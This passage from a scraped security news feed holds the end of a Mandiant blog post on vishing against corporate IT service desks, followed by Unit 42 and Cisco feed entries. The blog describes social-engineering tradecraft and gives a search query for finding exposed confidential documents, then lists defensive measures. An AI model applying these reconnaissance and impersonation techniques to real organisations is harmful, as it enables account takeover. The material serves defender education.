have gone unnoticed and potentially exploited by a real threat actor.</span></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &quot;The Defender&#x27;s Advantage podcast&quot;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f6997f268b0&gt;), (&#x27;btn_text&#x27;, &#x27;Listen now&#x27;), (&#x27;href&#x27;, &#x27;https://open.spotify.com/episode/33WgtCDvXBHTiagvmWN8Kj&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Open-Source Intelligence Gathering (OSINT)</span></h2>\n<p><span style=\"vertical-align: baseline;\">Effective social engineering campaigns are built upon extensive reconnaissance. The amount of information an attacker can source about corporate culture, employees, policies, procedures, and technologies in use directly impacts the maturity of a phishing scenario's development. A thorough search to provide a comprehensive overview of an organization from an outside perspective would include, but is not limited to, discovery of the following items:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Network ranges and IP address space</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Top-level domains and subdomains</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Cloud service providers and email infrastructure</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Internet-accessible and internally used web applications</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Code repositories</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Corporate phone numbers and email address formats</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Employee positions and titles</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Physical office locations</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Publicly exposed internal documentation</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Much of this information can often be found through publicly accessible resources. Company websites and marketing materials often list corporate contact information, including numbers for main lines, specific departments, or even individual employees. Social media platforms provide another means of profiling an organization. Professional networking services can be utilized to scrape the full names of employees and recreate corporate emails matching discovered naming conventions. Resumes shared on these platforms may also contain additional contact information including phone numbers and personal email addresses. Attackers may attempt to elicit private information by sending messages to employees from disposable email accounts, aiming to retrieve details through direct interaction or from out-of-office auto-replies. Additionally, public forums, where employees might seek troubleshooting assistance, can inadvertently reveal company-specific details</span><span style=\"vertical-align: baseline;\">. </span></p>\n<p><span style=\"vertical-align: baseline;\">Search engines, such as Google, DuckDuckGo, and Bing, provide advanced filtering capabilities to narrow results from targeted queries based on keywords, file types, and other parameters. Figure 1 includes an example of a search filter designed to uncover sensitive files for a given target that may be unknowingly exposed.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>“TARGET” filetype:pdf | filetype:doc | filetype:docx | filetype:xls | \nfiletype:xlsx | filetype:ppt | filetype:pptx intext:\"confidential\" | \nintext:\"internal use only\" | intext:\"not for public release\" | \nintext:\"restricted access\"</code></pre>\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline; color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Figure 1: Searching for documents with search filters</span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Anonymity networks, like The Onion Router (TOR), can be used to access hidden services, obtain restricted content, and identify supplemental data such as leaked employee IDs, usernames, passwords, and personally identifiable information (PII).  </span></p>\n<p><span style=\"vertical-align: baseline;\">The internet offers a vast array of resources, and a good amount of intelligence can be discovered without any overt interaction with your target.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Leveraging Automated Phone Services</span></h2>\n<p><span style=\"vertical-align: baseline;\">Some organizations make use of automated phone systems that have pre-recorded messages and interactive menus. These systems can provide callers with business-related information, facilitate employee self-service, or route calls to appropriate departments. If not found online, an attacker may attempt to obtain the phone number for an automated service by contacting an employee, often at a reception desk, claiming to have misplaced the number. Calling into these automated services allows an attacker to anonymously identify common issues faced by end users, names of internal applications, additional phone numbers for specific support teams, and, occasionally, alerts about company-wide technical issues. This type of information can be used to craft pretexts for subsequent activity that involves impersonating IT support.  </span></p></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Discovering Employee Identification Processes</span></h2>\n<p><span style=\"vertical-align: baseline;\">Actors engaged in voice-based social engineering ultimately aim to interact with a human operator. While some automated systems provide a direct option to speak with a live agent, others can require some initial information to be provided, such as an employee ID. However, even in these cases, it is common for repeated incorrect entries to result in the transfer to a live agent anyway. Service desk agents handle a high volume of inbound calls ranging from internal employees needing a password reset to external customers experiencing problems with a public-facing application. They are generally given a scripted process for call handling including information they need to request from the caller for identification as well as where to escalate if they are unable to address the issue directly.</span></p>\n<p><span style=\"vertical-align: baseline;\">During the reconnaissance phase in social engineering a service desk, an attacker may feign ignorance or push boundaries of information disclosure before a requirement for identification is enforced. It is also important for an attacker to take note of how service desk personnel react to incorrect or insufficient information being provided. For example, an attacker may provide an employee ID with an incorrect associated name to observe the response, potentially eliciting the correct full name or determining the validity of the employee ID format. Attackers may also call at different times to converse with varying staff members, use different voice modulations to conceal repeated reconnaissance attempts, and iteratively learn more about the service desk's identification process each time.</span></p>\n<p><span style=\"vertical-align: baseline;\">Alternatively, once a service desk number has been identified, an attacker can better target standard employees directly. Using publicly available resources, attackers can spoof the inbound number of a phone call to match that of the legitimate service desk. Without a procedure for verifying inbound callers claiming to be from IT, unsuspecting targets may be convinced by threat actors to perform actions that grant account access or divulge information that can be used to better impersonate staff.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Crafting a Convincing Narrative</span></h2>\n<p><span style=\"vertical-align: baseline;\">With sufficient reconnaissance data, an attacker can formulate targeted campaigns reflecting plausible employee scenarios. A common pretext for contacting a service desk is a forgotten password. Many organizations verify employees using multiple factors. While initial reconnaissance might provide an attacker with answers for knowledge-based authentication methods, challenges arise if device-based verification is required. An attacker might impersonate an employee who claims their phone is unavailable (e.g., damaged or lost during travel) and who needs urgent account access. Another common practice is for actors to impersonate employees identified as being on personal time off (PTO) via out-of-office replies, leveraging a sense of urgency to persuade service desk personnel. Responses to such situations can vary, especially for executive-level users. In the event of a successful MFA reset, the attacker can then call back and try to get a different agent on the phone to further reset the impersonated user's password for a full account compromise. If the legitimate employee is genuinely unavailable, unauthorized account access can persist for an extended period of time.</span></p>\n<h2><span style=\"vertical-align: baseline;\">The Evolution of an Exploit </span></h2>\n<p><span style=\"vertical-align: baseline;\">The compromise of a single account can serve as a foundation for more complex social engineering campaigns. Breaching the perimeter of an organization often grants an attacker access to internal workflows, chats, documents, meeting invites, and ways to better uncover verified intelligence on existing employees. Open-source tools such as </span><a href=\"https://github.com/dirkjanm/ROADtools/tree/master/roadrecon\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ROADrecon</span></a><span style=\"vertical-align: baseline;\"> can extract details from entire Entra ID tenants, potentially revealing phone numbers, employee IDs, and organizational hierarchy. Attackers may also seek access to IT ticketing systems and support channels to impersonate service desk staff to end-users who have open requests. The more information an attacker possesses, the more believable their pretext becomes, increasing the probability of success.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Strategic Recommendations and Best Practices</span></h2>\n<p><span style=\"vertical-align: baseline;\">Modern features in mobile technology, such as </span><a href=\"https://security.googleblog.com/2025/03/new-ai-powered-scam-detection-features.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI-powered Scam Detection on Android</span></a><span style=\"vertical-align: baseline;\">, demonstrate how software may be able to offer personal protection, but a comprehensive defense for organizations against vishing and related social engineering threats requires broad, proactive security initiatives and a defense-in-depth strategy. Mandiant recommends organizations consider the following best practices to reinforce their external perimeter and develop secure communication channels, particularly those involving IT support and employee verification.</span></p></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Positive Identity Verification for Service Desk Interactions</span></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Train service desk personnel to rigorously perform positive identity verification for all employees before modifying accounts or providing security-sensitive information (including during initial enrollment). This is critical for any privileged accounts.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Mandated verification methods should include options such as:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">On-camera/video conference verification where the employee presents a corporate badge or government-issued ID</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Utilization of an internal, up-to-date employee photo database</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Challenge/response questions based on information not easily discoverable externally (avoiding reliance on publicly available PII like date of birth or the last four digits of a Social Security number, as actors often possess this data)</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">For high-risk changes, such as MFA resets or password changes for privileged accounts, implement out-of-band verification (e.g., a call-back to a registered phone number or confirmation via a known corporate email address of the employee or their manager).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">During periods of heightened threat or suspected compromise, consider temporarily disabling self-service password or MFA reset methods and routing all such requests through a manual service desk workflow with enhanced scrutiny.</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Enforce Strong, Phishing-Resistant MFA</span></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">MFA should be enforced on all sensitive and internet-facing portals to prevent unauthorized access even in the event of a password compromise. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Standardize one primary MFA solution, for most employees, to simplify security architecture and centralize a platform for detections and alerts.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Remove weak forms of MFA, such as SMS, voice calls, or simple email links, as primary authentication factors. These are susceptible to vishing, SIM swapping, and other attacks</span><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Prioritize phishing-resistant MFA methods:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">FIDO2-compliant security keys (hardware tokens), especially for administrative and privileged users</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Authenticator applications providing number matching or robust geo-verification features</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Soft-tokens that are not reliant on easily intercepted channels</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Ensure administrative users cannot register or use legacy/weak MFA methods, even if those are permitted for other user tiers.</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Secure MFA Registration and Modification Processes</span></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Do not permit employees to self-register new MFA devices without stringent controls. Implement an IT-managed or otherwise secure enrollment process.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Restrict MFA registration and modification actions to only be permissible from trusted IP locations and/or compliant corporate devices.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Alert on and investigate suspicious MFA registration activities, such as the same MFA method or phone number being registered across multiple user accounts.</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Manager Involvement and Segregation of Duties</span></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Service desks should notify managers (via verified contact channels sourced from internal directories) upon an employee's password reset, especially for sensitive accounts.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Require manager approval, through a verified channel, for all MFA resets. This creates third-party awareness and an additional record.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">For larger organizations, consider segregating service desk responsibilities. Customer-facing support desks should generally not have permissions to modify internal corporate employee accounts.</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Employee Training and Vishing Awareness</span></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Conduct regular phishing simulation exercises that include vishing scenarios to educate employees about the specific risks of voice-based social engineering.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Train employees to always verify unexpected calls or requests for sensitive information, especially those claiming to be from IT support or other internal departments, by using an official internal directory to initiate a call-back or by contacting their manager.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Train employees to recognize common vishing pretexts (e.g., urgent requests to avoid negative consequences, claims of system issues requiring immediate action, unexpected MFA prompts).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Equip service desk employees with access to logs of previous calls and tickets to help identify abnormal patterns, such as repeated calls from unrecognized numbers or sequential MFA reset and password reset requests for the same user.</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Security Monitoring and Alerting for Vishing-Related Activity</span></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Utilize security information and event management (SIEM) and security orchestration, automation, and response (SOAR) technologies to monitor employee sign-in activity and service desk interactions.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Create specific alerts for the following:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Password reset activity, particularly for privileged accounts or outside of expected patterns</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">New MFA device enrollment or modification of existing MFA methods</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Multiple failed login attempts followed by a successful password or MFA reset</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">MFA fatigue attacks (multiple sequential incomplete authentications)</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">All activities flagged as abnormal should be reviewed by an internal security team and investigated with the impacted employee and their manager.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Further guidance on hardening against UNC3944-style threats, including broader identity, endpoint, and network infrastructure recommendations, is </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/unc3944-proactive-hardening-recommendations\"><span style=\"text-decoration: underline; vertical-align: baseline;\">detailed</span></a><span style=\"vertical-align: baseline;\"> by the Google Threat Intelligence Group (GTIG).</span></p></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Conclusion</span></h2>\n<p><span style=\"vertical-align: baseline;\">This discussion of voice-based social engineering and its proposed resolutions aims to provide insight into attack methodologies and preventative measures relevant to this threat vector. Organizations seeking direct support on this subject or other services related to attack simulation and red team exercises are encouraged to </span><a href=\"https://cloud.google.com/security/consulting/mandiant-red-team\"><span style=\"text-decoration: underline; vertical-align: baseline;\">contact</span></a><span style=\"vertical-align: baseline;\"> Mandiant for assistance. Mandiant can discuss specific needs in detail and explore tailored recommendations to better equip security postures against advanced and persistent threats.</span></p></div>"}
{"source": "Unit 42", "title": "Microsoft WSUS Remote Code Execution (CVE-2025-59287) Actively Exploited in the Wild", "link": "https://unit42.paloaltonetworks.com/microsoft-cve-2025-59287/", "published": "Mon, 27 Oct 2025 19:45:54 +0000", "summary": "<p>CVE-2025-59287 is a critical RCE vulnerability identified in Microsoft’s WSUS. Our observations from cases show a consistent methodology.</p>\n<p>The post <a href=\"https://unit42.paloaltonetworks.com/microsoft-cve-2025-59287/\">Microsoft WSUS Remote Code Execution (CVE-2025-59287) Actively Exploited in the Wild</a> appeared first on <a href=\"https://unit42.paloaltonetworks.com\">Unit 42</a>.</p>"}
{"source": "Unit 42", "title": "Cloud Discovery With AzureHound", "link": "https://unit42.paloaltonetworks.com/threat-actor-misuse-of-azurehound/", "published": "Fri, 24 Oct 2025 22:00:01 +0000", "summary": "<p>Unit 42 discusses the misuse of pentesting tool AzureHound by threat actors for cloud discovery. Learn how to detect this activity through telemetry.</p>\n<p>The post <a href=\"https://unit42.paloaltonetworks.com/threat-actor-misuse-of-azurehound/\">Cloud Discovery With AzureHound</a> appeared first on <a href=\"https://unit42.paloaltonetworks.com\">Unit 42</a>.</p>"}
{"source": "Unit 42", "title": "The Smishing Deluge: China-Based Campaign Flooding Global Text Messages", "link": "https://unit42.paloaltonetworks.com/global-smishing-campaign/", "published": "Thu, 23 Oct 2025 10:00:15 +0000", "summary": "<p>Global smishing activity tracked by Unit 42 includes impersonation of many critical services. Its unique ecosystem allows attackers to quickly scale.</p>\n<p>The post <a href=\"https://unit42.paloaltonetworks.com/global-smishing-campaign/\">The Smishing Deluge: China-Based Campaign Flooding Global Text Messages</a> appeared first on <a href=\"https://unit42.paloaltonetworks.com\">Unit 42</a>.</p>"}
{"source": "Unit 42", "title": "Jingle Thief: Inside a Cloud-Based Gift Card Fraud Campaign", "link": "https://unit42.paloaltonetworks.com/cloud-based-gift-card-fraud-campaign/", "published": "Wed, 22 Oct 2025 10:00:10 +0000", "summary": "<p>Threat actors behind the gift card fraud campaign Jingle Thief target retail via phishing and smishing, maintaining long-term access in cloud environments.</p>\n<p>The post <a href=\"https://unit42.paloaltonetworks.com/cloud-based-gift-card-fraud-campaign/\">Jingle Thief: Inside a Cloud-Based Gift Card Fraud Campaign</a> appeared first on <a href=\"https://unit42.paloaltonetworks.com\">Unit 42</a>.</p>"}
{"source": "Unit 42", "title": "The Golden Scale: Notable Threat Updates and Looking Ahead", "link": "https://unit42.paloaltonetworks.com/scattered-lapsus-hunters-updates/", "published": "Mon, 20 Oct 2025 23:00:11 +0000", "summary": "<p>Unit 42 shares notable developments of cybercrime group Scattered LAPSUS$ Hunters. Learn how this group may operate in the future.</p>\n<p>The post <a href=\"https://unit42.paloaltonetworks.com/scattered-lapsus-hunters-updates/\">The Golden Scale: Notable Threat Updates and Looking Ahead</a> appeared first on <a href=\"https://unit42.paloaltonetworks.com\">Unit 42</a>.</p>"}
{"source": "Unit 42", "title": "Threat Brief: Nation-State Actor Steals F5 Source Code and Undisclosed Vulnerabilities", "link": "https://unit42.paloaltonetworks.com/nation-state-threat-actor-steals-f5-source-code/", "published": "Thu, 16 Oct 2025 21:30:08 +0000", "summary": "<p>A nation-state actor stole BIG-IP source code and information on undisclosed vulnerabilities from F5. We explain what sets this theft apart from others.</p>\n<p>The post <a href=\"https://unit42.paloaltonetworks.com/nation-state-threat-actor-steals-f5-source-code/\">Threat Brief: Nation-State Actor Steals F5 Source Code and Undisclosed Vulnerabilities</a> appeared first on <a href=\"https://unit42.paloaltonetworks.com\">Unit 42</a>.</p>"}
{"source": "Unit 42", "title": "PhantomVAI Loader Delivers a Range of Infostealers", "link": "https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/", "published": "Wed, 15 Oct 2025 10:00:04 +0000", "summary": "<p>PhantomVAI is a new loader used to deploy multiple infostealers. We discuss its overall evolution and use of steganography and obfuscated scripts.</p>\n<p>The post <a href=\"https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/\">PhantomVAI Loader Delivers a Range of Infostealers</a> appeared first on <a href=\"https://unit42.paloaltonetworks.com\">Unit 42</a>.</p>"}
{"source": "Unit 42", "title": "Anatomy of an Attack: The \"BlackSuit Blitz\" at a Global Equipment Manufacturer", "link": "https://unit42.paloaltonetworks.com/anatomy-of-an-attack-blacksuit-ransomware-blitz/", "published": "Tue, 14 Oct 2025 23:00:01 +0000", "summary": "<p>BlackSuit ransomware delivered by APT Ignoble Scorpius started with a vishing attack. Read how Unit 42 helped and the ultimate outcome.</p>\n<p>The post <a href=\"https://unit42.paloaltonetworks.com/anatomy-of-an-attack-blacksuit-ransomware-blitz/\">Anatomy of an Attack: The &quot;BlackSuit Blitz&quot; at a Global Equipment Manufacturer</a> appeared first on <a href=\"https://unit42.paloaltonetworks.com\">Unit 42</a>.</p>"}
{"source": "Unit 42", "title": "The Golden Scale: Bling Libra and the Evolving Extortion Economy", "link": "https://unit42.paloaltonetworks.com/scattered-lapsus-hunters/", "published": "Fri, 10 Oct 2025 21:00:18 +0000", "summary": "<p>Scattered Lapsus$ Hunters: Organizations, be aware of the effort of this cybercriminal alliance as they target retail and hospitality for extortion.</p>\n<p>The post <a href=\"https://unit42.paloaltonetworks.com/scattered-lapsus-hunters/\">The Golden Scale: Bling Libra and the Evolving Extortion Economy</a> appeared first on <a href=\"https://unit42.paloaltonetworks.com\">Unit 42</a>.</p>"}
{"source": "Unit 42", "title": "When AI Remembers Too Much – Persistent Behaviors in Agents’ Memory", "link": "https://unit42.paloaltonetworks.com/indirect-prompt-injection-poisons-ai-longterm-memory/", "published": "Thu, 09 Oct 2025 22:00:11 +0000", "summary": "<p>Indirect prompt injection can poison long-term AI agent memory, allowing injected instructions to persist and potentially exfiltrate conversation history.</p>\n<p>The post <a href=\"https://unit42.paloaltonetworks.com/indirect-prompt-injection-poisons-ai-longterm-memory/\">When AI Remembers Too Much – Persistent Behaviors in Agents’ Memory</a> appeared first on <a href=\"https://unit42.paloaltonetworks.com\">Unit 42</a>.</p>"}
{"source": "Unit 42", "title": "The ClickFix Factory: First Exposure of IUAM ClickFix Generator", "link": "https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/", "published": "Wed, 08 Oct 2025 10:00:22 +0000", "summary": "<p>Unit 42 discovers ClickFix phishing kits, commoditizing social engineering. This kit presents a lowered barrier for inexperienced cybercriminals.</p>\n<p>The post <a href=\"https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/\">The ClickFix Factory: First Exposure of IUAM ClickFix Generator</a> appeared first on <a href=\"https://unit42.paloaltonetworks.com\">Unit 42</a>.</p>"}
{"source": "Unit 42", "title": "Responding to Cloud Incidents: A Step-by-Step Guide From the 2025 Unit 42 Global Incident Response Report", "link": "https://unit42.paloaltonetworks.com/responding-to-cloud-incidents/", "published": "Tue, 07 Oct 2025 23:00:19 +0000", "summary": "<p>Cloud breaches are rising. This step-by-step guide from Unit 42 shows how to investigate, contain and recover from cloud-based attacks.</p>\n<p>The post <a href=\"https://unit42.paloaltonetworks.com/responding-to-cloud-incidents/\">Responding to Cloud Incidents: A Step-by-Step Guide From the 2025 Unit 42 Global Incident Response Report</a> appeared first on <a href=\"https://unit42.paloaltonetworks.com\">Unit 42</a>.</p>"}
{"source": "Unit 42", "title": "TOTOLINK X6000R: Three New Vulnerabilities Uncovered", "link": "https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/", "published": "Wed, 01 Oct 2025 10:00:08 +0000", "summary": "<p>Researchers identified vulnerabilities in TOTOLINK X6000R routers: CVE-2025-52905, CVE-2025-52906 and CVE-2025-52907. We discuss root cause and impact.</p>\n<p>The post <a href=\"https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/\">TOTOLINK X6000R: Three New Vulnerabilities Uncovered</a> appeared first on <a href=\"https://unit42.paloaltonetworks.com\">Unit 42</a>.</p>"}
{"source": "Unit 42", "title": "Phantom Taurus: A New Chinese Nexus APT and the Discovery of the NET-STAR Malware Suite", "link": "https://unit42.paloaltonetworks.com/phantom-taurus/", "published": "Tue, 30 Sep 2025 10:00:34 +0000", "summary": "<p>Phantom Taurus is a previously undocumented Chinese threat group. Explore how this group's distinctive toolset lead to uncovering their existence.</p>\n<p>The post <a href=\"https://unit42.paloaltonetworks.com/phantom-taurus/\">Phantom Taurus: A New Chinese Nexus APT and the Discovery of the NET-STAR Malware Suite</a> appeared first on <a href=\"https://unit42.paloaltonetworks.com\">Unit 42</a>.</p>"}
{"source": "Unit 42", "title": "Threat Insights: Active Exploitation of Cisco ASA Zero Days", "link": "https://unit42.paloaltonetworks.com/zero-day-vulnerabilities-affect-cisco-software/", "published": "Fri, 26 Sep 2025 20:30:22 +0000", "summary": "<p>CVE-2025-20333, CVE-2025-20362 and CVE-2025-20363 affect multiple Cisco products, and are being exploited by a threat actor linked to the ArcaneDoor campaign. </p>\n<p>The post <a href=\"https://unit42.paloaltonetworks.com/zero-day-vulnerabilities-affect-cisco-software/\">Threat Insights: Active Exploitation of Cisco ASA Zero Days</a> appeared first on <a href=\"https://unit42.paloaltonetworks.com\">Unit 42</a>.</p>"}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: Continued Attacks Against Cisco Firewalls", "link": "https://sec.cloudapps.cisco.com/security/center/resources/asa_ftd_continued_attacks?vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20Continued%20Attacks%20Against%20Cisco%20Firewalls%26vs_k=1", "published": "2025-09-25 16:22:44.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: September 2025 Semiannual Cisco IOS and IOS XE Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-75296&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20September%202025%20Semiannual%20Cisco%20IOS%20and%20IOS%20XE%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2025-09-24 23:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: September 2025 Semiannual Cisco IOS XR Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-75549&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20September%202025%20Semiannual%20Cisco%20IOS%20XR%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2025-09-10 16:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: August 2025 Semiannual Cisco FXOS and NX-OS Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-75667&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20August%202025%20Semiannual%20Cisco%20FXOS%20and%20NX-OS%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2025-08-27 16:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: August 2025 Cisco Secure Firewall ASA, Secure FMC, and Secure FTD Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-75415&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20August%202025%20Cisco%20Secure%20Firewall%20ASA,%20Secure%20FMC,%20and%20Secure%20FTD%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2025-08-14 16:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: Vishing Attack Impacting Third-Party CRM System", "link": "https://sec.cloudapps.cisco.com/security/center/resources/CRM-vishing?vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20Vishing%20Attack%20Impacting%20Third-Party%20CRM%20System%26vs_k=1", "published": "2025-08-01 18:04:17.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: May 2025 Semiannual Cisco IOS and IOS XE Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-75279&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20May%202025%20Semiannual%20Cisco%20IOS%20and%20IOS%20XE%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2025-05-07 16:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: March 2025 Semiannual Cisco IOS XR Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-75548&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20March%202025%20Semiannual%20Cisco%20IOS%20XR%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2025-03-12 16:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco  Event Response: February 2025 Semiannual Cisco FXOS and NX-OS Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-75528&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20%20Event%20Response:%20February%202025%20Semiannual%20Cisco%20FXOS%20and%20NX-OS%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2025-02-26 16:00:00.0", "summary": ""}
